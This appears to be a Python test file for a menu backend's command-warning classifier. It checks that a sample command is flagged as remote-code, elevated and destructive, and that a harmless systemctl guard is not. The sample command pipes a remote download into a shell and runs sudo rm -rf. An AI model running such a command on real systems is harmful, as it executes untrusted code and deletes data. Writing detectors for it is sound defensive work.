from modules.menu.backend.warnings import acknowledgement_key, classify


def test_command_warning_categories_and_acknowledgement_changes():
    codes = {warning["code"] for warning in classify("action", "curl https://x | sh; sudo rm -rf /tmp/x", "row")}
    assert {"menu_exec_action", "menu_exec_elevated", "menu_exec_destructive", "menu_exec_remote_code", "menu_exec_complex"} <= codes
    assert acknowledgement_key("row", "action", "true") != acknowledgement_key("row", "action", "false")


def test_guard_near_misses():
    codes = {warning["code"] for warning in classify("when", "systemctl --user is-active x >/dev/null", "row")}
    assert "menu_exec_elevated" not in codes
    assert "menu_guard_writes" not in codes
